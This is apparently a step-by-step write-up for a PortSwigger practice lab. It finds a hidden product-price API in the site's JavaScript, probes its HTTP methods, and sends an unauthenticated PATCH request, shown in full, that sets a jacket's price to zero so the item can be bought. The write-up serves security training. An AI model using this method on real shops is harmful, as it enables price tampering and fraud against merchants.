The steps below are meant to solve the following lab:
https://portswigger.net/web-security/learning-paths/api-testing/api-testing-identifying-and-interacting-with-api-endpoints/api-testing/lab-exploiting-unused-api-endpoint


On the main page of the lab there is a script tag that references the API.
<script type="text/javascript" src="/resources/js/api/productPrice.js"></script>


We can read the JavaScript program by visiting the source above.
https://[LAB_SUB_DOMAIN].web-security-academy.net/resources/js/api/productPrice.js

In the JavaScript we can find the api endpoint needed to solve this lab. 
const loadPricing = (productId) => {
    const url = new URL(location);
    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
        .then(res => res.json())
        .then(handleResponse(getAddToCartForm()));
};

window.onload = () => {
    const url = new URL(location);
    const productId = url.searchParams.get('productId');
    if (url.pathname.startsWith("/product") && productId != null) {
        loadPricing(productId);
}


The URL for the API, pulled from the above JavaScript:
https://[LAB_SUB_DOMAIN].web-security-academy.net/api/products/${encodeURIComponent(productId)}/price


We can replace ${encodeURIComponent(productId)} with the productId for the Leet Jacket, which is 1.
https://[LAB_SUB_DOMAIN].web-security-academy.net/api/products/1/price


Sending a GET request to the above URL returns a JSON string with the Leet Jacket price and a message.
{"price":"$1337.00","message":"Buy quick, we are low on stock! 3 purchased in the last 25 minutes!"}


Changing the method from GET to POST results in a response of 405 Method Not Allowed.  
POST /api/products/1/price

HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"


Trying instead with a PATCH method will result in a response of 400 Bad Request and a JSON message telling us that only JSON is supported.
PATCH /api/products/1/price HTTP/

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93

{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}


Changing the content type to JSON and sending {"price": 0} will successfully change the price of the Leet Jacket to zero dollars and zero cents. 

PATCH /api/products/1/price HTTP/2
Host: [LAB_SUB_DOMAIN].web-security-academy.net
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Te: trailers
Content-Type: application/json
Content-Length: 17

{
	"price": 0
}



HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}

Now the Jacket can be purchased and the lab passed.
